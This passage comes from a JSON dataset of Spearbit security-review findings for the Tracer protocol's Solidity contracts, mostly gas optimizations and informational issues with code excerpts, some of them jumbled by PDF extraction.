        "body": "The ERC20_Cloneable contract contains a transferOwnership() function that may only be called by the owner, which is PoolFactory. However PoolFactory doesnt call the function so it is essentially dead code, making the deployment cost unnecessary additional gas. function transferOwnership(address _owner) external onlyOwner { require(_owner != address(0), \"Owner: setting to 0 address\"); owner = _owner; }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use cached values when present",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The updateAggregateBalance() function creates a temporary variable id with the value currentIn- Immediately after that, currentIntervalIds[i] is used again. This could be replaced by id to tervalIds[i]. save gas. function updateAggregateBalance(address user) public override checkInvariantsAfterFunction { ... for (uint256 i = 0; i < unAggregatedLength; i++) { uint256 id = currentIntervalIds[i]; if (currentIntervalIds[i] == 0) { // could use id continue; }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "_invariantCheckContract stored twice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "Both the PoolCommitter and LeveragedPool contracts store the value of _invariantCheckContract twice, both in invariantCheckContract and invariantCheck. This is not necessary and costs extra gas. contract PoolCommitter is IPoolCommitter, Initializable { ... address public invariantCheckContract; IInvariantCheck public invariantCheck; ... function initialize( ..., address _invariantCheckContract, ... ) external override initializer { ... invariantCheckContract = _invariantCheckContract; invariantCheck = IInvariantCheck(_invariantCheckContract); ... } } contract LeveragedPool is ILeveragedPool, Initializable, IPausable { ... address public invariantCheckContract; IInvariantCheck public invariantCheck; ... function initialize(ILeveragedPool.Initialization calldata initialization) external override initializer { ,! ... invariantCheckContract = initialization._invariantCheckContract; invariantCheck = IInvariantCheck(initialization._invariantCheckContract); } }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unnecessary if/else statement in LeveragedPool",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "A boolean variable is used to indicate the type of token to mint. The if/else statement can be avoided by using LONG_INDEX or SHORT_INDEX as the parameter instead of a bool to indicate the use of long or short token. uint256 public constant LONG_INDEX = 0; uint256 public constant SHORT_INDEX = 1; ... function mintTokens(bool isLongToken,...){ if (isLongToken) { IPoolToken(tokens[LONG_INDEX]).mint(...); } else { IPoolToken(tokens[SHORT_INDEX]).mint(...); ...",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Uncached array length used in loop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The users array length is used in a for loop condition, therefore the length of the array is evaluated in every loop iteration. Evaluating it once and caching it can save gas. for (uint256 i; i < users.length; i++) { ... }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unnecessary deletion of array elements in a loop is expensive",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The unAggregatedCommitments[user] array is deleted after the for loop in updateAggregateBal- ance. Therefore, deleting the array elements one by one with delete unAggregatedCommitments[user][i]; in the loop body costs unnecessary gas.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Zero-value transfers are allowed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "Given that claim() can return 0 when the claim isnt valid yet due to updateInterval, the return value should be checked to avoid doing an unnecessary sendValue() call with amount 0. Address.sendValue( payable(msg.sender), claim(user, poolCommitterAddress, poolCommitter, currentUpdateIntervalId) );",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unneeded onlyUnpaused modifier in setQuoteAndPool()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The setQuoteAndPool() function is only callable once, from the factory contract during deployment, due to the onlyFactory modifier. During this call, the contract is always unpaused, therefore the onlyUnpaused modifier is not necessary.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unnecessary mapping access in AutoClaim.makePaidClaimRequest()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "Resolving mappings consumes more gas than directly accessing the storage struct, therefore its more gas-efficient to use the already de-referenced variable than to resolve the mapping again. function makePaidClaimRequest(address user) external payable override onlyPoolCommitter { ClaimRequest storage request = claimRequests[user][msg.sender]; ... uint256 reward = claimRequests[user][msg.sender].reward; ... claimRequests[user][msg.sender].updateIntervalId = requestUpdateIntervalId; claimRequests[user][msg.sender].reward = msg.value;",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Function complexity can be reduced from linear to constant by rewriting loops",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The add() function of the PriceObserver contract shifts an entire array if the buffer is full, and the SMA() function of the SMAOracle contract sums the values of an array to calculate its average. Both of these functions have O(n) complexity and could be rewritten to have O(1) complexity. This would save gas and possibly increase the buffer size. 31 contract PriceObserver is Ownable, IPriceObserver { ... * @dev If the backing array is full (i.e., `length() == capacity()`, then * it is rotated such that the oldest price observation is deleted function add(int256 x) external override onlyWriter returns (bool) { ... if (full()) { leftRotateWithPad(x); ... } function leftRotateWithPad(int256 x) private { uint256 n = length(); /* linear scan over the [1, n] subsequence */ for (uint256 i = 1; i < n; i++) { observations[i - 1] = observations[i]; } ... } contract SMAOracle is IOracleWrapper { * @dev O(k) complexity due to linear traversal of the final `k` elements of `xs` ... function SMA(int256[24] memory xs, uint256 n, uint256 k) public pure returns (int256) { ... /* linear scan over the [n - k, n] subsequence */ for (uint256 i = n - k; i < n; i++) { S += xs[i]; } ... } }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unused observer state variable in PoolKeeper",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "There is no use for the observer state variable. It is only used in performUpkeepSinglePool in a require statement to check if is set. address public observer; function setPriceObserver(address _observer) external onlyOwner { ... observer = _observer; ... function performUpkeepSinglePool(...) require(observer != address(0), \"Observer not initialized\"); ...",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Usage of temporary variable instead of type casting in PoolKeeper.performUpkeepSinglePool()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The pool temporary variable is used to cast the address to ILeveragedPool. Casting the address directly where the pool variable is used saves gas, as _pool is calldata.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Events and event emissions can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "PoolFactory.deployPool() would result in: Having a single DeployCommitter event to be emitted after setQuoteAndPool() in 1. Having better UX/event tracking and alignment with the current behavior to emit events during the Factory deployment. 2. Removing the QuoteAndPoolChanged event that is emitted only once during the lifetime of the PoolCommitter during PoolFactory.deployPool(). 3. Removing the ChangeIntervalSet emission in PoolCommitter.initialize(). The changeInterval has not really changed, it was initialized. This can be tracked by the DeployCommitter event.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Multi-paid claim rewards should be sent only if nonzero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "In both multiPaidClaimMultiplePoolCommitters() and multiPaidClaimSinglePoolCommitter(), there could be cases where the reward sent back to the claimer is zero. In these scenarios, the reward value should be checked to avoid wasting gas.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unnecessary quad arithmetic use where integer arithmetic works",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The ABDKMathQuad library is used to compute a division which is then truncated with toUint(). Semantically this is equivalent to a standard uint division, which is more gas efficient. The same library is also unnecessarily used to compute keepers reward. This can be safely done by using standard uint computation. function appropriateUpdateIntervalId(...) ... uint256 factorDifference = ABDKMathQuad.toUInt(divUInt(frontRunningInterval, updateInterval)); function keeperReward(...) ... int256 wadRewardValue = ABDKMathQuad.toInt( ABDKMathQuad.add( ABDKMathQuad.fromUInt(_keeperGas), ABDKMathQuad.div( ( ABDKMathQuad.div( (ABDKMathQuad.mul(ABDKMathQuad.fromUInt(_keeperGas), _tipPercent)), ABDKMathQuad.fromUInt(100) ) ), FIXED_POINT ) ) ); uint256 decimals = IERC20DecimalsWrapper(ILeveragedPool(_pool).quoteToken()).decimals(); uint256 deWadifiedReward = PoolSwapLibrary.fromWad(uint256(wadRewardValue), decimals);",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Custom errors should be used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "In the latest Solidity versions it is possible to replace the strings used to encode error messages with custom errors, which are more gas efficient. AutoClaim.sol: PoolCommitter\"); ,! AutoClaim.sol: AutoClaim.sol: PoolCommitter\"); ,! AutoClaim.sol: require(poolFactory.isValidPoolCommitter(msg.sender), \"msg.sender not valid require(_poolFactoryAddress != address(0), \"PoolFactory address == 0\"); require(poolFactory.isValidPoolCommitter(poolCommitterAddress), \"Invalid require(users.length == poolCommitterAddresses.length, \"Supplied arrays must be same length\"); ,! ChainlinkOracleWrapper.sol: require(_oracle != address(0), \"Oracle cannot be 0 address\"); ChainlinkOracleWrapper.sol: require(_deployer != address(0), \"Deployer cannot be 0 address\"); ChainlinkOracleWrapper.sol: require(_decimals <= MAX_DECIMALS, \"COA: too many decimals\"); ChainlinkOracleWrapper.sol: require(answeredInRound >= roundID, \"COA: Stale answer\"); ChainlinkOracleWrapper.sol: require(timeStamp != 0, \"COA: Round incomplete\"); ERC20_Cloneable.sol: ERC20_Cloneable.sol: InvariantCheck.sol: InvariantCheck.sol: LeveragedPool.sol: require(msg.sender == owner, \"msg.sender not owner\"); require(_owner != address(0), \"Owner: setting to 0 address\"); require(_factory != address(0), \"Factory address cannot be null\"); require(poolFactory.isValidPool(poolToCheck), \"Pool is invalid\"); require(!paused, \"Pool is paused\"); 36 LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: require(!paused, \"Pool is paused\"); require(!paused, \"Pool is paused\"); require(msg.sender == keeper, \"msg.sender not keeper\"); require(msg.sender == invariantCheckContract, \"msg.sender not invariantCheckContract\"); ,! LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: address\"); ,! LeveragedPool.sol: address\"); ,! LeveragedPool.sol: be 0 address\"); ,! LeveragedPool.sol: cannot be 0 address\"); ,! LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: address\"); ,! LeveragedPool.sol: address\"); ,! LeveragedPool.sol: be 0 address\"); ,! LeveragedPool.sol: require(msg.sender == poolCommitter, \"msg.sender not poolCommitter\"); require(msg.sender == governance, \"msg.sender not governance\"); require(initialization._feeAddress != address(0), \"Fee address cannot be 0 require(initialization._quoteToken != address(0), \"Quote token cannot be 0 require(initialization._oracleWrapper != address(0), \"Oracle wrapper cannot require(initialization._settlementEthOracle != address(0), \"Keeper oracle require(initialization._owner != address(0), \"Owner cannot be 0 address\"); require(initialization._keeper != address(0), \"Keeper cannot be 0 address\"); require(initialization._longToken != address(0), \"Long token cannot be 0 require(initialization._shortToken != address(0), \"Short token cannot be 0 require(initialization._poolCommitter != address(0), \"PoolCommitter cannot require(initialization._invariantCheckContract != address(0), \"InvariantCheck cannot be 0 address\"); require(initialization._fee < PoolSwapLibrary.WAD_PRECISION, \"Fee >= 100%\"); require(initialization._secondaryFeeSplitPercent <= 100, \"Secondary fee split cannot exceed 100%\"); as old governance address\"); ,! LeveragedPool.sol: LeveragedPool.sol: ,! LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: ,! LeveragedPool.sol: address\"); ,! LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: ,! PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: ,! PoolCommitter.sol: PoolCommitter.sol: invariantCheckContract\"); require(initialization._updateInterval != 0, \"Update interval cannot be 0\"); require(intervalPassed(), \"Update interval hasn't passed\"); require(account != address(0), \"Account cannot be 0 address\"); require(msg.sender == _oldSecondaryFeeAddress); require(_keeper != address(0), \"Keeper address cannot be 0 address\"); require(_governance != governance, \"New governance address cannot be same require(_governance != address(0), \"Governance address cannot be 0 require(governanceTransferInProgress, \"No governance change active\"); require(msg.sender == _provisionalGovernance, \"Not provisional governor\"); require(paused, \"Pool is live\"); require(!paused, \"Pool is paused\"); require(msg.sender == governance, \"msg.sender not governance\"); require(!paused, \"Pool is paused\"); require(!paused, \"Pool is paused\"); require(!paused, \"Pool is paused\"); require(msg.sender == invariantCheckContract, \"msg.sender not require(msg.sender == factory, \"Committer: not factory\"); require(msg.sender == leveragedPool, \"msg.sender not leveragedPool\"); require(msg.sender == user || msg.sender == address(autoClaim), \"msg.sender not committer or AutoClaim\"); require(_factory != address(0), \"Factory address cannot be 0 address\"); require(_invariantCheckContract != address(0), \"InvariantCheck address cannot be 0 address\"); ,! PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: require(_autoClaim != address(0), \"AutoClaim address cannot be null\"); require(_mintingFee < PoolSwapLibrary.WAD_PRECISION, \"Minting fee >= 100%\"); require(_burningFee < PoolSwapLibrary.WAD_PRECISION, \"Burning fee >= 100%\"); require(userCommit.balanceLongBurnAmount <= balance.longTokens, \"Insufficient pool tokens\"); ,! PoolCommitter.sol: require(userCommit.balanceShortBurnAmount <= balance.shortTokens, ,! \"Insufficient pool tokens\"); 37 ,! PoolCommitter.sol: PoolCommitter.sol: address\"); ,! PoolCommitter.sol: address\"); ,! PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: ,! PoolFactory.sol: ,! PoolFactory.sol: ,! PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolKeeper.sol: PoolKeeper.sol: PoolKeeper.sol: PoolKeeper.sol: PoolKeeper.sol: PoolSwapLibrary.sol: PoolSwapLibrary.sol: PoolSwapLibrary.sol: PoolSwapLibrary.sol: PriceObserver.sol: PriceObserver.sol: PriceObserver.sol: SMAOracle.sol: ,! SMAOracle.sol: PoolCommitter.sol: require(userCommit.balanceLongBurnMintAmount <= balance.longTokens, \"Insufficient pool tokens\"); ,! PoolCommitter.sol: require(userCommit.balanceShortBurnMintAmount <= balance.shortTokens, \"Insufficient pool tokens\"); require(amount > 0, \"Amount must not be zero\"); require(_quoteToken != address(0), \"Quote token address cannot be 0 require(_leveragedPool != address(0), \"Leveraged pool address cannot be 0 require(_feeReceiver != address(0), \"Address cannot be null\"); require(_poolKeeper != address(0), \"PoolKeeper not set\"); require(autoClaim != address(0), \"AutoClaim not set\"); require(invariantCheck != address(0), \"InvariantCheck not set\"); require(IOracleWrapper(deploymentParameters.oracleWrapper).deployer() == msg.sender,\"Deployer must be oracle wrapper owner\"); require(deploymentParameters.leverageAmount >= 1 && deploymentParameters.leverageAmount <= maxLeverage,\"PoolKeeper: leveraged amount invalid\"); require(IERC20DecimalsWrapper(deploymentParameters.quoteToken).decimals() <= MAX_DECIMALS,\"Decimal precision too high\"); require(_poolKeeper != address(0), \"address cannot be null\"); require(_invariantCheck != address(0), \"address cannot be null\"); require(_autoClaim != address(0), \"address cannot be null\"); require(newMaxLeverage > 0, \"Maximum leverage must be non-zero\"); require(_feeReceiver != address(0), \"address cannot be null\"); require(newFeePercent <= 100, \"Secondary fee split cannot exceed 100%\"); require(_fee <= 0.1e18, \"Fee cannot be > 10%\"); require(_mintingFee <= 1e18, \"Fee cannot be > 100%\"); require(_burningFee <= 1e18, \"Fee cannot be > 100%\"); require(_changeInterval <= 1e18, \"Change interval cannot be > 100%\"); require(msg.sender == address(factory), \"Caller not factory\"); require(_factory != address(0), \"Factory cannot be 0 address\"); require(_observer != address(0), \"Price observer cannot be 0 address\"); require(firstPrice > 0, \"First price is non-positive\"); require(observer != address(0), \"Observer not initialized\"); require(timestamp >= lastPriceTimestamp, \"timestamp in the past\"); require(price != 0, \"price == 0\"); require(price != 0, \"price == 0\"); require(price != 0, \"price == 0\"); require(msg.sender == writer, \"PO: Permission denied\"); require(i < length(), \"PO: Out of bounds\"); require(_writer != address(0), \"PO: Null address not allowed\"); require(_spotOracle != address(0) && _observer != address(0) && _deployer require(_periods > 0 && _periods <= IPriceObserver(_observer).capacity(), require(_spotDecimals <= MAX_DECIMALS, \"SMA: Decimal precision too high\"); require(_updateInterval != 0, \"Update interval cannot be 0\"); require(block.timestamp >= lastUpdate + updateInterval, \"SMA: Too early to require(k > 0 && k <= n && k <= uint256(type(int256).max), \"SMA: Out of != address(0),\"SMA: Null address forbidden\"); \"SMA: Out of bounds\"); ,! SMAOracle.sol: SMAOracle.sol: SMAOracle.sol: update\"); ,! SMAOracle.sol: ,! bounds\");",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Different updateIntervals in SMAOracle and pools",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The updateIntervals for the pools and the SMAOracles are different. If the updateInterval for SMAOracle is larger than the updateInterval for poolUpkeep(), then the oracle price update could happen directly after the poolUpkeep(). It is possible to perform permissionless calls to poll(). In combination with a delayed poolUpkeep() an attacker could manipulate the timing of the SMAOracle price, because after a call to poll() it cant be called again until updateInterval has passed. contract LeveragedPool is ILeveragedPool, Initializable, IPausable { function initialize(ILeveragedPool.Initialization calldata initialization) external override initializer { ,! ... updateInterval = initialization._updateInterval; ... } function poolUpkeep(... ) external override onlyKeeper { require(intervalPassed(), \"Update interval hasn't passed\"); ... } function intervalPassed() public view override returns (bool) { unchecked { return block.timestamp >= lastPriceTimestamp + updateInterval; } } contract SMAOracle is IOracleWrapper { constructor(..., uint256 _updateInterval, ... ) { updateInterval = _updateInterval; } function poll() external override returns (int256) { require(block.timestamp >= lastUpdate + updateInterval, \"SMA: Too early to update\"); return update(); } }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "Tight coupling between LeveragedPool and PoolCommitter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The LeveragedPool and PoolCommitter contracts call each other back and forth. This could be optimized to make the code clearer and perhaps save some gas. Here is an example: contract LeveragedPool is ILeveragedPool, Initializable, IPausable { function poolUpkeep(...) external override onlyKeeper { ... IPoolCommitter(poolCommitter).executeCommitments(_boundedIntervals, _numberOfIntervals); ... } } contract PoolCommitter is IPoolCommitter, Initializable { function executeCommitments(...) external override onlyPool { ... uint256 lastPriceTimestamp = pool.lastPriceTimestamp(); uint256 updateInterval = pool.updateInterval(); ... } } // call to first contract // call to first contract",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "Code in SMA() is hard to read",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The SMA() function checks for k being smaller or equal to uint256(type(int256).max), a value somewhat difficult to read. Additionally, the number 24 is hardcoded. Note: This issue was also mentioned in Runtime Verification report: B15 PriceObserver - avoid magic values function SMA( int256[24] memory xs, uint256 n, uint256 k) public pure returns (int256) { ... require(k > 0 && k <= n && k <= uint256(type(int256).max), \"SMA: Out of bounds\"); ... for (uint256 i = n - k; i < n; i++) { S += xs[i]; } ... }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "Code is chain-dependant due to fixed block time and no support for EIP-1559",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "The PoolKeeper contract has several hardcoded assumptions about the chain on which it will be deployed. It has no support for EIP-1559 and doesnt use block.basefee. On Ethereum Mainnet the blocktime will change to 12 seconds with the ETH2 merge. The Secureum CARE-X report also has an entire discussion about other chains. contract PoolKeeper is IPoolKeeper, Ownable { ... uint256 public constant BLOCK_TIME = 13; /* in seconds */ ... /// Captures fixed gas overhead for performing upkeep that's unreachable /// by `gasleft()` due to our approach to error handling in that code uint256 public constant FIXED_GAS_OVERHEAD = 80195; ... }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "ABDKQuad-related constants defined outside PoolSwapLibrary",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "Some ABDKQuad-related constants are defined outside of the PoolSwapLibrary while others are shadowing the ones defined inside the library. As all ABDKQuad-related logic is contained in the library its less error prone to have any ABDKQuad-related definitions in the same file. The constant one is lowercase, while usually constants are uppercase. contract PoolCommitter is IPoolCommitter, Initializable { bytes16 public constant one = 0x3fff0000000000000000000000000000; ... // Set max minting fee to 100%. This is a ABDKQuad representation of 1 * 10 ** 18 bytes16 public constant MAX_MINTING_FEE = 0x403abc16d674ec800000000000000000; } library PoolSwapLibrary { /// ABDKMathQuad-formatted representation of the number one bytes16 public constant one = 0x3fff0000000000000000000000000000; }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "Lack of a state to allow withdrawal of tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "Immediately after the invariants dont hold and the pool has been paused, Governance can withdraw the collateral (quote). It might be prudent to create a separate state besides paused, such that unpause actions cant happen anymore to indicate withdrawal intention. Note: the comment in withdrawQuote() is incorrect. Pool must be paused. /** ... * @dev Pool must not be paused // comment not accurate ... */ ... function withdrawQuote() external onlyGov { require(paused, \"Pool is live\"); IERC20 quoteERC = IERC20(quoteToken); uint256 balance = quoteERC.balanceOf(address(this)); IERC20(quoteToken).safeTransfer(msg.sender, balance); emit QuoteWithdrawn(msg.sender, balance); }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "Undocumented frontrunning protection",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "PoolFactory deployPool() per(deploymentParameters.oracleWrapper).deployer() == msg.sender frontrunning the deployment transaction of the pool. function the In of contract, check the protects IOracleWrap- against This is because the poolCommitter, LeveragedPool and the pair tokens instances are deployed at a deterministic address, calculated from the values of leverageAmount, quoteToken and oracleWrapper. An attacker cannot frontrun the pool deployment because of the different msg.sender address, that causes the deployer() check to fail. Alternatively, the attacker will have a different oracleWrapper, resulting in a different pool. However, this is not obvious to a casual reader. function deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) { ... require( IOracleWrapper(deploymentParameters.oracleWrapper).deployer() == msg.sender, \"Deployer must be oracle wrapper owner\" ); ... bytes32 uniquePoolHash = keccak256( abi.encode( deploymentParameters.leverageAmount, deploymentParameters.quoteToken, deploymentParameters.oracleWrapper ) ); PoolCommitter poolCommitter = PoolCommitter( Clones.cloneDeterministic(poolCommitterBaseAddress, uniquePoolHash) ); ... LeveragedPool pool = LeveragedPool(Clones.cloneDeterministic(poolBaseAddress, uniquePoolHash)); ... } function deployPairToken(... ) internal returns (address) { ... bytes32 uniqueTokenHash = keccak256( abi.encode( deploymentParameters.leverageAmount, deploymentParameters.quoteToken, deploymentParameters.oracleWrapper, direction ) ); PoolToken pairToken = PoolToken(Clones.cloneDeterministic(pairTokenBaseAddress, ,! uniqueTokenHash)); ... }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "No event exists for users self-claiming commits",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "There is no event emitted when a user self-claims a previous commit for themselves, in contrast to claim() which does emit the PaidRequestExecution event.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "Mixups of types and scaling factors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "There are a few findings that are related to mixups of types or scaling factors. The following types and scaling factors are used:  uint (no scaling)  uint (WAD scaling)  ABDKMathQuad  ABDKMathQuad (WAD scaling) Solidity >0.8.9s user defined value types could be used to prevent mistakes. This will require several typecasts, but they dont add extra gas costs.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing events for setInvariantCheck() and setAutoClaim() in PoolFactory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "Events should be emitted for access-controlled critical functions, and functions that set protocol parameters or affect the protocol in significant ways.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "Terminology used for tokens and oracles is not clear and consistent across codebase",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "Different terms are used across the codebase to address the different tokens, leading to some mixups. Assuming a pair BTC/USDC is being tracked with WETH as collateral, we think the following definitions apply:  collateral token == quote token == settlement token == WETH  pool token == long token + short token == long BTC/USDC + short BTC/USDC As for the oracles:  settlementEthOracle is the oracle for settlement in ETH (WETH/ETH)  oracleWrapper is the oracle for BTC/USDC Here is an example of a mixup: The comments in getMint() and getBurn() are different while their result should be similar. It seems the comment on getBurn() has reversed settlement and pool tokens. * @notice Calculates the number of pool tokens to mint, given some settlement token amount and a ,! price ... * @return Quantity of pool tokens to mint ... function getMint(bytes16 price, uint256 amount) public pure returns (uint256) { ... } * @notice Calculate the number of settlement tokens to burn, based on a price and an amount of ,! pool tokens //settlement & pool seem reversed ... * @return Quantity of pool tokens to burn ... function getBurn(bytes16 price, uint256 amount) public pure returns (uint256) { ... } The settlementTokenPrice variable in keeperGas() is misleading and not clear whether it is Eth per Settlement or Settlement per Eth. contract PoolKeeper is IPoolKeeper, Ownable { function keeperGas(..) public view returns (uint256) { int256 settlementTokenPrice = ,! IOracleWrapper(ILeveragedPool(_pool).settlementEthOracle()).getPrice(); ... } }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect NatSpec and comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "Some NatSpec documentation and comments contain incorrect or unclear information. In PoolSwapLibraryL283-L293, the NatSpec for the isBeforeFrontRunningInterval() function refers to uncom- mitment, which is not longer supported. * @notice Returns true if the given timestamp is BEFORE the frontRunningInterval starts, * function isBeforeFrontRunningInterval(...) which is allowed for uncommitment. In LeveragedPool.sol#L511 the NatSpec for the withdrawQuote() function notes that the pool should not be paused while the require checks that it is paused. * @dev Pool must not be paused function withdrawQuote() ... { require(paused, \"Pool is live\"); In LeveragedPool.sol#L47 the comment is unclear, as it references a singular update interval but the mapping points to arrays. // The most recent update interval in which a user committed mapping(address => uint256[]) public unAggregatedCommitments; In PoolToken.sol#L16-L23 both the order and the meaning of the documentation are wrong.  The @param lines order should be switched.  @param amount Pool tokens to burn should be replaced with @param amount Pool tokens to mint  @param account Account to burn pool tokens to should be replaced with @param account Account to mint pool tokens to /** * @notice Mints pool tokens - * @param amount Pool tokens to burn - * @param account Account to burn pool tokens to + * @param account Account to mint pool tokens to + * @param amount Pool tokens to mint */ function mint(address account, uint256 amount) external override onlyOwner { ... } In PoolToken.sol#L25-L32 the order of the @param lines is reversed. 47 /** * @notice Burns pool tokens - * @param amount Pool tokens to burn - * @param account Account to burn pool tokens from + * @param account Account to burn pool tokens from + * @param amount Pool tokens to burn */ function burn(address account, uint256 amount) external override onlyOwner { ... } In PoolFactory.sol#L176-L203 the NatSpec @param for poolOwner is missing. It would also be suggested to change the parameter name from poolOwner to pool, since the parameter received from deployPool is the address of the pool and not the owner of the pool. /** * @notice Deploy a contract for pool tokens + * @param pool The pool address, owner of the Pool Token * @param leverage Amount of leverage for pool * @param deploymentParameters Deployment parameters for parent function * @param direction Long or short token, L- or S- * @return Address of the pool token */ function deployPairToken( - + address poolOwner, address pool, string memory leverage, PoolDeployment memory deploymentParameters, string memory direction ) internal returns (address) { ... pairToken.initialize(poolOwner, poolNameAndSymbol, poolNameAndSymbol, settlementDecimals); pairToken.initialize(pool, poolNameAndSymbol, poolNameAndSymbol, settlementDecimals); ... - + } In PoolSwapLibrary.sol#L433-L454 the comments for two of the parameters of function getMintWithBurns() are reversed. * @param amount ... * @param oppositePrice ... ... function getMintWithBurns( ... bytes16 oppositePrice, uint256 amount, ... 